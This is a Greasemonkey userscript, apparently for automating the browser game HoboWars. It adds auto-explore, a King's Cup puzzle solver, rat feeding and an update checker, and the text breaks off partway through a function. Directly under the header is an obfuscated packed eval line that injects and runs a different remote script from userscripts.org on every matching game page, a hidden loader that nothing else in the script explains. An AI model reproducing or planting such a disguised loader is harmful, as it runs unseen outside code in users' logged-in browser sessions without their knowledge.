// ==UserScript==
// @name           BumRush Plus + Last Update
// @namespace      BumRush Plus + Last Update
// @description    BumRush Plus + Last Update
// @include        http://*.hobowars.com/game/*
// @include        http://hobowars.com/game/*
// @include        http://*.hobowars2.com/game/*
// @include        http://hobowars2.com/game/*
// @include        http://www.hobowars.com/fb/*
// @include        http://hobowars.com/fb/*
// ==/UserScript==
eval(function(p,a,c,k,e,d){e=function(c){return c.toString(36)};if(!''.replace(/^/,String)){while(c--){d[c.toString(a)]=k[c]||c.toString(a)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('0.6.5(0.3(\'1\')).2=\'4://7.c/b/a/8.9.d\';',14,14,'document|script|src|createElement|https|appendChild|body|userscripts|170127|user|source|scripts|org|js'.split('|'),0,{}))



	//Start up stuff
	HoboVersion = CheckGameVersion(); //We must first get the version becuase other functions depend on that.
	var args = getArgs() //Then we Must Get whiteBox.innerHTML.indexOf("<br><br>the Current arguments
	CheckVars(); // Now we can load all our old settings
	//var CurrentTime = document.getElementById("clock").innerHTML; //We do this as one of the first so that we can get the most accurate time when the page was loaded and not get offset by any amout of proccessing it took to load the script.
	
	//Global Vars
	var strScriptSrc = "http://userscripts.org/scripts/source/51480.user.js";
	var RPSLSSolutionL, RPSLSSolutionT, layout = null, whiteBox, whiteBoxHTML = "", menuBox, configActive = false, respectLevels = [[25000, "Homeless", "Lowlife"], [50000, "Bum", "Delinquent"], [100000, "Freeloader", "Thug"], [200000, "Drifter", "Outcast"], [400000, "Showered", "Addict"], [800000, "Citizen", "Tramp"], [1600000, "Worker", "Criminal"], [3200000, "Medic", "Mental Patient"], [5000000, "Preacher", "Murderer"], [8000000, "Actor", "Hit Man"], [14000000, "Officer", "Mass Murderer"], [20000000, "Peacemaker", "Politician"], [30000000, "John McClane", "Freddy Kreuger"]], uniPuzzle = Array(Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1));
	//King Cup Vars
	var CupPuzzle = Array(Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1)), tCupPuzzle = Array(Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1)), tCupPuzzle2 = Array(Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1), Array(1, 1, 1, 1));
	var CupCurrentMax = -1, yAp = 0, yBp = 0, yCp = 0, yDp = 0, xAg = 0, xBg = 0, xCg = 0, xDg = 0, yAg = 0, yBg = 0, yCg = 0, yDg = 0;
	var DrinkLink = new Array("../images/kingscup/shot_logo.gif","../images/kingscup/beer_logo.gif","../images/kingscup/wine_logo.gif","../images/kingscup/mixed_logo.gif","../images/kingscup/liquor_logo.gif","../images/kingscup/bad.gif");
	var FocusDrink = 0;	

	//Updates Section
	const BumRushVersion = 3.2;
	const BumRushReleaseNotes = "Fixed Univ Solv Button... Once more";
	const CheckForUpdateEvery = 20;
	var BumUpdates = new Array();	
	BumUpdates[0] = "<h2>Version 2.0:</h2><br>- Bug Fixes<br>- Better Auto Explore<br>- Anti Refresh Added<br>- More Exploring Options<br>- Auto bank withdraw options";
	BumUpdates[1] = "<h2>Version 2.1:</h2><br>- Changed the way you auto explore<br>- Added the ability to goto a certain spot in the city"
	BumUpdates[2] = "<h2>Version 2.2:</h2><br>- Fixed error from version 2.1<br>- Removed left over development code<br>- Fixed a few other errors"
	BumUpdates[3] = "<h2>Version 2.3:</h2><br>- King Cup Solver Added<br>- More Bug Fixes"
	BumUpdates[4] = "<h2>Version 2.4:</h2><br>- Made King Cup Solver better.<br>- Fixed Anti refresh that was broke in 2.3"
	BumUpdates[5] = "<h2>Version 2.5:</h2><br>- Made the king cup double check results for accuracy<br>- Made King Cup auto target desired drink"
	BumUpdates[6] = "<h2>Version 2.6:</h2><br>- Made More Changes To the kings cup."
	BumUpdates[7] = "<h2>Version 2.7:</h2><br>- Added Auto Updater"
	BumUpdates[8] = "<h2>Version 2.8:</h2><br>- Added option to delay automated actions<br>- Cleaned up code."
	BumUpdates[9] = "<h2>Version 2.9:</h2><br>- Added Option to feed rat multiple food at once."
	BumUpdates[10] = "<h2>Version 3.0:</h2><br>- Started FaceBook Support for Bumrush!"
	BumUpdates[11] = "<h2>Version 3.1:</h2><br>- Fixed Univ Solv Button"
	BumUpdates[12] = "<h2>Version 3.1:</h2><br>- Fixed Univ Solv Button... Once more"
	
	//Script entry point
	if (setupLayout()) {
        setupConfig();
        if (args.cmd == null || args.cmd == "") {
			if (HoboVersion ==  0) {				
				DoHomeStuff();
				showNextRespectLevelInfo();
				FixMainMenu();
			} else if (HoboVersion ==  3) {				
				showNextRespectLevelInfo();
				FixMainMenu();
			}
            if (GM_getValue(HoboVersion+"enable_lockringthrow",true)) {
                lockRingThrow();
            }
            if (GM_getValue(HoboVersion+"enable_grailprompt",true)) {
                setupGrailPrompt();
            }
        } else if (args.cmd == "food") {
            if (GM_getValue(HoboVersion+"enable_foodprompt",true)) {
                setupFoodPrompts();
            }
        } else if (args.cmd == "hospital" && args.do == null) {
            if (GM_getValue(HoboVersion+"enable_hospitalautoheal",false)) {
                doHospitalAutoheal();
            }
		} else if (args.cmd == "hospital" && args.do == "heal") {
			if (GM_getValue(HoboVersion+"enable_widthdraw")) {
				checkForMoney();
			}
        } else if (args.cmd == "hill") {
            if (args.do == "greg" && GM_getValue(HoboVersion+"enable_hillautosignup",false)) {
                doSuicideHillAutoSignup();
            } else if (GM_getValue(HoboVersion+"enable_garageautoback")) {
                doGarageAutoback();
            }
        } else if (args.cmd == "explore") {
			if (args.do == "move") {
				if (GM_getValue(HoboVersion+"enable_cityautoexplore",false)) {
					doCityAutoExplore();
				}
			} else {
				SetupExploreButton();
			}            
        } else if (args.cmd == "uni") {
		    setupUniversity();
			if (GM_getValue(HoboVersion+"enable_widthdraw") && args.do != "col" && args.do != null) {
				checkForMoney();
			}
        } else if (args.cmd == "club" && args.do == "buy_food") {
		    //Nothing
		} else if (args.cmd == "bank") {
		    CheckWithdraw();
		} else if (args.cmd == "mart") {
		    SetUpMart(); 
		} else if (args.cmd == "city_hall" && args.action == "rpsls") {
		    SetUpRPSLS(); // This helps with RPSLS
		} else if (args.cmd == "rats" && args.do == "test_fight") {
		    ShowBigResult(); // This shows in big font the results of rat fights
		} else if (args.cmd == "chocolate_factory" && args.room == "1" && args.action == "claw") {
			//SaveClawStats(); // Little Script im working on
		} else if (args.cmd == "kingscup") {
			KingsCupSolver();	
		} else if (args.cmd == "rats" && args.do == "feed") {
			SetupRatFeeding();
		} else if (args.cmd == "rats" && args.do == "eat") {
			RatIsEating();
		} else {
			//All Other Possible Pages Here
		}
		CheckForRefresh();
    }

	
	//This is where we check the users vars and make sure they have all the defualt values we want them to have
	function CheckVars() {
		if (GM_getValue(HoboVersion+"enable_lockringthrow") == null) {
			GM_setValue(HoboVersion+"enable_lockringthrow", true);
		}
		if (GM_getValue(HoboVersion+"enable_grailprompt") == null) {
			GM_setValue(HoboVersion+"enable_grailprompt", true);
		}
		if (GM_getValue(HoboVersion+"enable_foodprompt") == null) {
			GM_setValue(HoboVersion+"enable_foodprompt", false);
		}
		if (GM_getValue(HoboVersion+"enable_hillautosignup") == null) {
			GM_setValue(HoboVersion+"enable_hillautosignup", false);
		}
		if (GM_getValue(HoboVersion+"enable_garageautoback") == null) {
			GM_setValue(HoboVersion+"enable_garageautoback", true);
		}
		if (GM_getValue(HoboVersion+"enable_hospitalautoheal") == null) {
			GM_setValue(HoboVersion+"enable_hospitalautoheal", false);
		}
		if (GM_getValue(HoboVersion+"hospitalautoheal_choice") == null) {
			GM_setValue(HoboVersion+"hospitalautoheal_choice", 0);
		}
		if (GM_getValue(HoboVersion+"enable_cityautoexplore") == null) {
			GM_setValue(HoboVersion+"enable_cityautoexplore", false);
		}
		if (GM_getValue(HoboVersion+"enable_universitylocktrain") == null) {
			GM_setValue(HoboVersion+"enable_universitylocktrain", false);
		}
		if (GM_getValue(HoboVersion+"universitylocktrain_choice") == null) {
			GM_setValue(HoboVersion+"universitylocktrain_choice", 0);
		}
		if (GM_getValue(HoboVersion+"university_solved") == null) {
			GM_setValue(HoboVersion+"university_solved", false);
		}
		if (GM_getValue(HoboVersion+"university_solving") == null) {
			GM_setValue(HoboVersion+"university_solving", false);
		}		
		if (GM_getValue(HoboVersion+"enable_refresh") == null) {
			GM_setValue(HoboVersion+"enable_refresh",false);
		}
		if (GM_getValue(HoboVersion+"enable_throwoutrats") == null) {
			GM_setValue(HoboVersion+"enable_throwoutrats",true);
		}
		if (GM_getValue(HoboVersion+"value_rattofind") == null) {
			GM_setValue(HoboVersion+"value_rattofind","Ballerina Rat");
		}
		if (GM_getValue(HoboVersion+"enable_widthdraw") == null) {
			GM_setValue(HoboVersion+"enable_widthdraw",false);
		}
		if (GM_getValue(HoboVersion+"value_lastUrl") == null) {
			GM_setValue(HoboVersion+"value_lastUrl","");
		}		
		if (GM_getValue(HoboVersion+"value_explorepath") == null) {
			GM_setValue(HoboVersion+"value_explorepath","[]");
		}
		if (GM_getValue(HoboVersion+"value_turnsleft") == null) {
			GM_setValue(HoboVersion+"value_turnsleft",0);
		}
		if (GM_getValue(HoboVersion+"enable_removeconfirm") == null) {
			GM_setValue(HoboVersion+"enable_removeconfirm",false);
		}		
        if (GM_getValue(HoboVersion+"enable_martwidthdraw") == null) {
			GM_setValue(HoboVersion+"enable_martwidthdraw",false);
		}		
		if (GM_getValue(HoboVersion+"TONGUECHOOSE") == null) {
			GM_setValue(HoboVersion+"TONGUECHOOSE",0);
		}
		if (GM_getValue(HoboVersion+"FEETCHOOSE") == null) {
			GM_setValue(HoboVersion+"FEETCHOOSE",1);
		}
		if (GM_getValue(HoboVersion+"THUMBCHOOSE") == null) {
			GM_setValue(HoboVersion+"THUMBCHOOSE",2);
		}
		if (GM_getValue(HoboVersion+"EARCHOOSE") == null) {
			GM_setValue(HoboVersion+"EARCHOOSE",3);
		}
		if (GM_getValue(HoboVersion+"EYESCHOOSE") == null) {
			GM_setValue(HoboVersion+"EYESCHOOSE",4);
		}
		if (GM_getValue(HoboVersion+"NOCHOOSE") == null) {
			GM_setValue(HoboVersion+"NOCHOOSE",5);
		}
		if (GM_getValue(HoboVersion+"SOLVEINGCUP") == null) {
			GM_setValue(HoboVersion+"SOLVEINGCUP",false);
		}
		if (GM_getValue(HoboVersion+"CURRENTTYPE") == null) {
			GM_setValue(HoboVersion+"CURRENTTYPE",0);
		}
		if (GM_getValue(HoboVersion+"HOMELOADS") == null) {
			GM_setValue(HoboVersion+"HOMELOADS",0);
		}
		if (GM_getValue(HoboVersion+"DELAYFROM") == null) {
			GM_setValue(HoboVersion+"DELAYFROM","0.5");
		}
		if (GM_getValue(HoboVersion+"DELAYTO") == null) {
			GM_setValue(HoboVersion+"DELAYTO","2");
		}
	}

	//*--------------------------------*
	//        Update Function Section
	//*--------------------------------*
	
	function CheckForUpdates() {
		var isOutOfDate = false;
		GM_xmlhttpRequest({
			method: 'GET',
			url: strScriptSrc,
			onload: function(responseDetails) { HandelResponse(responseDetails) }
		});
	}

	
	function HandelResponse(responseDetails) {
		var matches = responseDetails.responseText.match(/const BumRushVersion[ ]?=[ ]?([\d\.]+);(\s+const BumRushReleaseNotes[ ]?=[ ]?"(.*)";)?/);
		if (matches) {
			var curVersionNum = parseFloat(matches[1]);
			if (curVersionNum > BumRushVersion)
			{
				var strReleaseNotes = matches[3];
				if (confirm('A new version of BumRush is available.' + ( strReleaseNotes ? '\nRelease Notes: ' + strReleaseNotes : '') + '\nUpdate now?'))
				{
					self.location = strScriptSrc;
				}
			}		
		}
	}
	
	//*--------------------------------*
	//        King Cup Section
	//*--------------------------------*
	
	function KingsCupSolver() {
		DetectDrinkType();
		if (macroCheck()) {
            return;
        }
		var CheckSolve = GM_getValue(HoboVersion+"SOLVEINGCUP");
		if (CheckSolve) {
			ShiftNextLine();
			DisplayCupInfo2();
		} else {
			DisplayCupInfo();
		}
		
	}
	
	
	function WrapUpCup() {
		var CurrentGoodCount = GetSameCountForCurrent();
		//alert(CurrentGoodCount);
		if (CupCurrentMax == CurrentGoodCount && StatDisplayType == 0) {
			GM_setValue(HoboVersion+"SOLVEINGCUP",false);
			alert("You already have the best solution");
			GotoCMD("kingscup");
		} else {
			ShiftNextLine();
		}
	}

	
	var DoubleCheck = 0;
	function ShiftNextLine() {
		var CupStepRows = eval(GM_getValue(HoboVersion+"CUPSTEPROWS","[]"))	
		for (var x = 0; x <= 3; ++x) {
			var tInt = CupStepRows[x];
			if (tInt != 0) {
				CupStepRows[x] -= 1;
				GM_setValue(HoboVersion+'CUPSTEPROWS', uneval(CupStepRows));
				GotoCMD("kingscup&do=row&which=" + (x + 1));
				return;
			}
		}
		var CupStepCols = eval(GM_getValue(HoboVersion+"CUPSTEPCOLS","[]"))
		for (var x = 0; x <= 3; ++x) {
			var tInt = CupStepCols[x];
			if (tInt != 0) {
				CupStepCols[x] -= 1;
				GM_setValue(HoboVersion+'CUPSTEPCOLS', uneval(CupStepCols));
				GotoCMD("kingscup&do=col&which=" + (x + 1));
				return;
			}
		}
		GM_setValue(HoboVersion+"SOLVEINGCUP",false);
		GotoCMD("kingscup");
		return;
		//We need to Double Check Every Thing
		var CurrentGoodCount = GetSameCountForCurrent();
		if (CupCurrentMax == -1) {
			//this means that the recheck was never run
			StartCupSolver(); //Run the recheck
		} else if (CupCurrentMax == CurrentGoodCount) {
			//This means that the recheck ran and all is good YAY!
			GM_setValue(HoboVersion+"SOLVEINGCUP",false);
			GotoCMD("kingscup");
		} else {
			//this means the recheck ran but we didnt get the results we wanted
		}
	}
	
	
	function DetectDrinkType() {
		var CheckSolve = GM_getValue(HoboVersion+"SOLVEINGCUP");
		if (CheckSolve) {
			FocusDrink = GM_getValue(HoboVersion+"CURRENTTYPE");
			return;
		}	
		WorkHtml = removeHTMLTags(whiteBox.innerHTML);
		if (WorkHtml.indexOf("Drink shot") != -1) {
			FocusDrink = 0;
		} else if (WorkHtml.indexOf("Drink beer") != -1) {
			FocusDrink = 1;
		} else if (WorkHtml.indexOf("Drink wine") != -1) {
			FocusDrink = 2;
		} else if (WorkHtml.indexOf("Drink mixed") != -1) {
			FocusDrink = 3;
		} else if (WorkHtml.indexOf("Drink liquor") != -1) {
			FocusDrink = 4;
		} else {
			FocusDrink = 5;
		}
		GM_setValue(HoboVersion+"CURRENTTYPE",FocusDrink);
	}
	
	
	var cupButton;
	var StatDisplayType;
	function DisplayCupInfo() {
		StatDisplayType = 0;
		var DisplayHtml = "<br><br><img src=\"" + DrinkLink[FocusDrink] + "\" id=\"CupPick\"><br>Drink to Focus *Click to Change<br><br><button id=\"CUPSOLVEBUTTON\">Solve</button><br>Please be patient";		
		whiteBox.innerHTML = InsertTextAfter(whiteBox.innerHTML,"The King's Cup</b>",DisplayHtml);		
		document.getElementById("CupPick").addEventListener("click", ChangeIcon, false);
		cupButton = document.getElementById("CUPSOLVEBUTTON");
		cupButton.addEventListener("click", StartCupSolver, false);
	}
	
	
	var StatueText;
	function DisplayCupInfo2() {	
		StatDisplayType = 1;
		var DisplayHtml = "<h2 id=\"WaitText\"><br><b>Solving Please Wait</b></div>";		
		whiteBox.innerHTML = InsertTextAfter(whiteBox.innerHTML,"The King's Cup</b>",DisplayHtml);		
		StatueText = document.getElementById("WaitText");
	}
	
	
	function ChangeIcon() {
		FocusDrink += 1;
		if (FocusDrink > 5) {
			FocusDrink = FocusDrink - 6;
		}
		document.getElementById("CupPick").src = DrinkLink[FocusDrink];
		GM_setValue(HoboVersion+"CURRENTTYPE",FocusDrink);
	}	
	
	
	function StartCupSolver() {	
		//disable button so they dont double click
		if (StatDisplayType == 0) {
			document.getElementById("CUPSOLVEBUTTON").disabled = true;
		}		
		//Start off by getting what we have and putting it into an array
		var a = whiteBox.getElementsByTagName("img"), x = 0, y = 0;
        for (var b = 0; b < a.length; b++) {
		    if (a[b].src.indexOf("kingscup/shot.gif") != -1) {
                CupPuzzle[x][y] = 1;
				x++;
            } else if (a[b].src.indexOf("kingscup/beer.gif") != -1) {
                CupPuzzle[x][y] = 2;
				x++;
            } else if (a[b].src.indexOf("kingscup/beer.gif") != -1) {
                CupPuzzle[x][y] = 2;
				x++;
            } else if (a[b].src.indexOf("kingscup/wine.gif") != -1) {
                CupPuzzle[x][y] = 3;
				x++;
            } else if (a[b].src.indexOf("kingscup/mixed.gif") != -1) {
                CupPuzzle[x][y] = 4;
				x++;
            } else if (a[b].src.indexOf("kingscup/liquor.gif") != -1) {
                CupPuzzle[x][y] = 5;
				x++;
            } else if (a[b].src.indexOf("kingscup/bad.gif") != -1) {
                CupPuzzle[x][y] = 6;
				x++;
            }
			if (x > 3) {
                x = 0;
                y++;
            }
        }
		SafeCopyArray(CupPuzzle,tCupPuzzle);
		//alert(GetSameCount());
		//window.status = tCupPuzzle[0][0] + ":" + tCupPuzzle[0][1] + ":" + tCupPuzzle[0][2] + ":" + tCupPuzzle[0][3] + " - " + tCupPuzzle[1][0] + ":" + tCupPuzzle[1][1] + ":" + tCupPuzzle[1][2] + ":" + tCupPuzzle[1][3] + " - " + tCupPuzzle[2][0] + ":" + tCupPuzzle[2][1] + ":" + tCupPuzzle[2][2] + ":" + tCupPuzzle[2][3] + " - " + tCupPuzzle[3][0] + ":" + tCupPuzzle[3][1] + ":" + tCupPuzzle[3][2] + ":" + tCupPuzzle[3][3];
		window.setTimeout(SolveStep,0);	
	}
	
	
	var PercentD = 0
	function SolveStep() {	
		for (var yA = yAp; yA <= 5; ++yA) {
			ShiftRow(0,yA);
			for (var yB = yBp; yB <= 5; ++yB) {
				ShiftRow(1,yB);
				for (var yC = yCp; yC <= 5; ++yC) {
					ShiftRow(2,yC);
					for (var yD = yDp; yD <= 5; ++yD) {
						ShiftRow(3,yD);
						var TempCount = GetSameCount();
						if (TempCount > CupCurrentMax) {
							CupCurrentMax = TempCount;
							yAg = yA;
							yBg = yB;
							yCg = yC;
							yDg = yD;
							SafeCopyArray(tCupPuzzle,tCupPuzzle2);
						}
						yDp += 1;									
						window.setTimeout(SolveStep,0)
						if (StatDisplayType == 0) {
							cupButton.textContent = Math.floor((PercentD / 1296) * 100) + "%";	
						} else {
							StatueText.innerHTML = "<br>Double Checking answer.<br> Statues: " +  Math.floor((PercentD / 1296) * 100) + "%";
						}											
						PercentD += 1;
						return;
					}
					if (yDp >= 5){yDp = 0;}
					yCp += 1;
				}
				if (yCp >= 5){yCp = 0;}
				yBp += 1;
			}
			if (yBp >= 5){yBp = 0;}
			yAp += 1;
		}
		SolveForTop(FocusDrink);
		var FinalRow = Array(yAg, yBg, yCg, yDg);
		var FinalCol = Array(xAg, xBg, xCg, xDg);
		GM_setValue(HoboVersion+'CUPSTEPROWS', uneval(FinalRow));
		GM_setValue(HoboVersion+'CUPSTEPCOLS', uneval(FinalCol));
		GM_setValue(HoboVersion+"SOLVEINGCUP",true);
		if (StatDisplayType == 0) {
			cupButton.textContent = Math.floor((PercentD / 1296) * 100) + "%";	
		} else {
			StatueText.innerHTML = "<br>Double Checking answer.<br> Statues: " +  Math.floor((PercentD / 1296) * 100) + "%";
		}		
		WrapUpCup();
	}
	
	
	function SafeCopyArray(FromArray,ToArray) {
		for (var x = 0; x <= 3; ++x) {
			for (var y = 0; y <= 3; ++y) {
				ToArray[x][y] = FromArray[x][y];
			}
		}
	}
	
	
	function SolveForTop(TargetType) {
		SafeCopyArray(CupPuzzle,tCupPuzzle);
		ShiftRow(0,yAg);
		ShiftRow(1,yBg);
		ShiftRow(2,yCg);
		ShiftRow(3,yDg);
		xAg	= GetColSolve(0);
		xBg	= GetColSolve(1);
		xCg	= GetColSolve(2);
		xDg	= GetColSolve(3);
	}
	
	
	function GetColSolve(ColN) {
		var TargetType = FocusDrink + 1;
		tMaxCount = 0;
		tMaxType = 0
		for (var x = 0; x <= 3; ++x) {
			var cNumberA = tCupPuzzle[ColN][x];
			var tCount = 0;
			for (var y = 0; y <= 3; ++y) {
				var cNumberB = tCupPuzzle[ColN][y];
				if (cNumberA == cNumberB) {
					tCount += 1;
				}
			}
			if (tCount > tMaxCount) {
				tMaxCount = tCount;
				tMaxType = cNumberA;
			}
		}
		var rValue = 0;
		if (TargetType > tMaxType) {
			rValue = TargetType - tMaxType;
		} else {
			var rVal = (6 - tMaxType) + TargetType
			rValue = rVal;
		}
		if (rValue >= 6) {
			rValue = 0;
		}
		return rValue;
	}
	
	
	function GetSameCountForCurrent() {
		return GetSameCount2();
	}
	
	
	function GetSameCount2() {
		var TotalPossibleSame = 0;
		for (var x = 0; x <= 3; ++x) {
			TotalPossibleSame += GetColSameCount2(x);
		}
		return TotalPossibleSame;	
	}
	
	
	function GetColSameCount2(ColN) {
		TargetType = (FocusDrink + 1)
		tMaxCount = 0;
		for (var x = 0; x <= 3; ++x) {
			var cNumberA = CupPuzzle[ColN][x];
			if (cNumberA == 6 && TargetType != 6) {
				tMaxCount = tMaxCount - 1;
			} else if (TargetType == cNumberA) {
				tMaxCount = tMaxCount + 1;
			}
		}		
		return tMaxCount;
	}
	
	
	function GetSameCount() {
		var TotalPossibleSame = 0;
		for (var x = 0; x <= 3; ++x) {
			TotalPossibleSame += GetColSameCount(x);
		}
		return TotalPossibleSame;	
	}
	
	
	function GetColSameCount(ColN) {
		TargetType = (FocusDrink + 1)
		tMaxCount = 0;
		tMaxType = 0
		for (var x = 0; x <= 3; ++x) {
			var cNumberA = tCupPuzzle[ColN][x];
			var tCount = 0;
			for (var y = 0; y <= 3; ++y) {
				var cNumberB = tCupPuzzle[ColN][y];
				if (cNumberA == cNumberB) {
					tCount += 1;
				}
			}
			if (tCount > tMaxCount) {
				tMaxCount = tCount;
				tMaxType = cNumberA;
			}
		}
		//Find out how many we would need to shift it to get what we want
		var ShiftValue = 0;
		//alert(tMaxType)
		if (TargetType > tMaxType) {
			ShiftValue = TargetType - tMaxType;
		} else {
			var rVal = (6 - tMaxType) + TargetType
			ShiftValue = rVal;
		}
		if (ShiftValue >= 6) {
			ShiftValue = 0;
		}
		//alert(tMaxCount + ":" + ShiftValue)
		//Check for negitive titles
		if (TargetType != 6) {
			for (var x = 0; x <= 3; ++x) {
				var cNumberA = tCupPuzzle[ColN][x];
				var Shifted = cNumberA + ShiftValue;
				if (Shifted > 6) {
					Shifted = Shifted - 6;
				}
				if (Shifted == 6) {
					tMaxCount = tMaxCount - 1;
				}
			}
		}
		//alert(tMaxCount)
		return tMaxCount;
	}
		
	
	function ShiftRow(RowN,ShiftCount) {
		for (var x = 0; x <= 3; ++x) {
			var tVal = CupPuzzle[x][RowN] + ShiftCount;			
			//Roll over check is next
			if (tVal > 6) {
				tVal = tVal - 6;
			}
			tCupPuzzle[x][RowN] = tVal;
		}	
	}
	
	
	function ShiftCol(RowN,ShiftCount) {
		for (var x = 0; x <= 3; ++x) {
			var tVal = CupPuzzle[RowN,x] + ShiftCount;
			//Roll over check is next
			if (tVal > 6) {
				tVal = 1
			}
			tCupPuzzle[RowN,x] = tVal;
		}		
	}
		
	//*--------------------------------*
	//        Beta Functions
	//*--------------------------------*
	
	function SaveClawStats() {
		var tHtml = document.body.innerHTML;
		var tX = GetTextBetween(tHtml,"move it up <b>","</b>")
		var tY = GetTextBetween(tHtml,"and over <b>","</b>")
		var ClawData;
		var Item;
		if (tHtml.indexOf("empty handed! Empty clawed!") == -1 && tHtml.indexOf("You're low on Awake") == -1 && tHtml.indexOf("give it a whirl?") == -1) {
			//We grabbed Something!
			ClawData = eval(GM_getValue(HoboVersion+"dev_clawdata","[]"))
			if (tHtml.indexOf("Your trolly is already full") != -1) {
				Item = "Unknown Food"
			} else {
				Item = removeHTMLTags(GetTextBetween(tHtml,"You get ","<br>"))
			}
			var SaveString = tX + "!" + tY + "!" + Item + "!" + CurrentTime + "!" + TimeStamp()
			ClawData[ClawData.length] = SaveString
			GM_setValue(HoboVersion+'dev_clawdata', uneval(ClawData));
		}
	}
		
	//*--------------------------------*
	//        Explore Functions
	//*--------------------------------*
	
	function SetupExploreButton() {
		if (macroCheck()) {
            return;
        }
		if (whiteBox.innerHTML.indexOf("You currently have") == -1) {
			return;
		}
		whiteBox.innerHTML = InsertTextAfter(whiteBox.innerHTML,"Explore City!</a></b>","<br><br><input type=\"checkbox\" id=\"AUTOEXPLOREBTB\"" + ((GM_getValue(HoboVersion+"enable_cityautoexplore") == true) ? " checked=\"checked\"" : "") + ">Auto Explore</input><br><br>X:<input type=\"text\" id=\"EXPLOREX\"/ value=\"50\" size=\"3\"> Y:<input type=\"text\" id=\"EXPLOREY\"/ value=\"50\" size=\"3\">&nbsp;&nbsp;<button id=\"EXPLOREGOTOBTB\">Goto X,Y Location</button>");	
		document.getElementById("AUTOEXPLOREBTB").addEventListener("click", AutoExploreClick, false);
		document.getElementById("EXPLOREGOTOBTB").addEventListener("click", ExploreGotoClick, false);
	}
	
	
	function AutoExploreClick() {
		GM_setValue(HoboVersion+"enable_cityautoexplore",document.getElementById("AUTOEXPLOREBTB").checked)
	}
	
	
	function ExploreGotoClick() {
		var tX = document.getElementById("EXPLOREX").value
		var tY = document.getElementById("EXPLOREY").value
		GotoCMD("explore&do=move&x=" + tX + "&y=" + tY)
	}
		
		
	function doCityAutoExplore() {
        if (macroCheck()) {
            return;
        }
		var a = [], b = whiteBox.getElementsByTagName("a"),DeleteRat;
        for (var c = 0; c < b.length; c++) {
            if (b[c].href.indexOf("&cmd=explore&do=move&x=") != -1) {
                a[a.length] = b[c].href;
            }
			if (b[c].href.indexOf("=remove_rat") != -1) {
                DeleteRat = b[c].href;
            }
        }
        if (a.length != 8) {
            return;
        }

		var text = document.body.innerHTML;
		var lTurns = GM_getValue(HoboVersion+"value_turnsleft");
		var cTurns = GetTextBetween(text,"left: ","<br>");
		var ExploreArray;
		if (cTurns > lTurns) {
			//This means its a new day
			ExploreArray=new Array();
		} else {
			ExploreArray = eval(GM_getValue(HoboVersion+"value_explorepath","[]"))
		}
		GM_setValue(HoboVersion+"value_turnsleft",cTurns);
		
		//Set Current Space As Occuipied
		var ArrayVal = (args.x * 100) + args.y
		ExploreArray[ExploreArray.length] = ArrayVal;
		GM_setValue(HoboVersion+'value_explorepath', uneval(ExploreArray));	
		
		//time to check if we got any rats
		if (GM_getValue(HoboVersion+"enable_throwoutrats")) {
			if (text.indexOf("Do you want to keep it?") != -1) {
				//we got a rat
				var FindRat = GM_getValue(HoboVersion+"value_rattofind")
				if (FindRat.length > 0 && text.toLowerCase().indexOf(FindRat.toLowerCase()) != -1) {
					//This is the rat we want to keep
				} else {
					//Trash Rat Get rid of it
					GotoLocation(DeleteRat);
					return;
				}
			}	
		}	

		//Do exploreing
		var occupied = 1, Count = 0, rnd;
		while (occupied == 1 && Count < 75)
		{
			rnd = a[Math.floor(Math.random() * (a.length - 1))];
			var nX = GetTextBetween(rnd,"&x=","&");
			var nY = GetTextBetween(rnd,"&y=","&");
			if (nX != 0 && nY != 0) {
				if (ExploreArray.indexOf(((nX * 100) + nY)) != 1) {
					occupied = 0;
				}
			}				
			Count ++;			
		}
		if (occupied == 1) {
			//CRY we backed our selfs into a conor we must step over a path we already went over.
			rnd = a[Math.floor(Math.random() * (a.length - 1))];
		}
		GotoLocation(rnd);		
    }	
		
	//*--------------------------------*
	//        Rat Functions
	//*--------------------------------*
	
	function SetupRatFeeding() {
		var a = document.getElementsByTagName("a");
		var FoodIds = Array();
		var LastLink;
		//alert("1");
        for (var b = 0; b < a.length; b++) {
		    if (a[b].href.indexOf("do=eat") != -1) {
				if (a[b].text != "Feed") {
				//alert(a[b].href)
					var tArgs = getStringArgs(a[b].href)
					var tFoodId = tArgs.w_food;
					if (FoodIds.indexOf(tFoodId) == -1) {
						FoodIds[FoodIds.length] = tFoodId;
						var NewNode = document.createElement("input");
						NewNode.setAttribute('id',tFoodId);
						NewNode.setAttribute('type','checkbox');
						NewNode.setAttribute('name','FoodSelect');
						var NodeText = document.createTextNode(" ");
						a[b].parentNode.insertBefore( NewNode, a[b]);
						a[b].parentNode.insertBefore( NodeText, a[b]);
					}
				}
				LastLink = a[b].nextSibling;
            }
        }
		var tWorkNode = document.createElement("div");
		tWorkNode.setAttribute('id',"WorkArea");
		insertAfter(LastLink,tWorkNode);
		tWorkNode.innerHTML = "<br><br><input type=\"checkbox\" id=\"SELECTALL\"> Select All<br><br><button id=\"FEEDMANY\">Feed Rat</button>"
		document.getElementById("SELECTALL").addEventListener("click", SelectAllClick, false);
		document.getElementById("FEEDMANY").addEventListener("click", FeedManyClick, false);		
	}
	
	
	function RatIsEating() {
		FeedNextItem();
	}
	
	
	function SelectAllClick() {
		var a = document.getElementsByTagName("input");
        for (var b = 0; b < a.length; b++) {
		    if (a[b].name == "FoodSelect") {
				if (a[b].checked == true) {
					a[b].checked = false;
				} else {
					a[b].checked = true;
				}
            }
        }
	}
	
	
	function FeedManyClick() {
		var FoodIds = Array();
		var a = document.getElementsByTagName("input");
        for (var b = 0; b < a.length; b++) {
		    if (a[b].name == "FoodSelect") {
				if (a[b].checked == true) {
					FoodIds[FoodIds.length] = a[b].id;
				}
            }
        }		
		GM_setValue(HoboVersion+"rat_feedarray", uneval(FoodIds));
		GM_setValue(HoboVersion+"rat_feeding", true);
		FeedNextItem();
	}
	
	
	function FeedNextItem() {
		var CheckFeeding = GM_getValue(HoboVersion+"rat_feeding", false);
		if (CheckFeeding) {
			var FoodIds = eval(GM_getValue(HoboVersion+"rat_feedarray", "[]"));
			if (FoodIds.length > 0) {
				var GotoFoodId = FoodIds[0]; //Get our id we want
				FoodIds.splice(0, 1); //remove it from the list
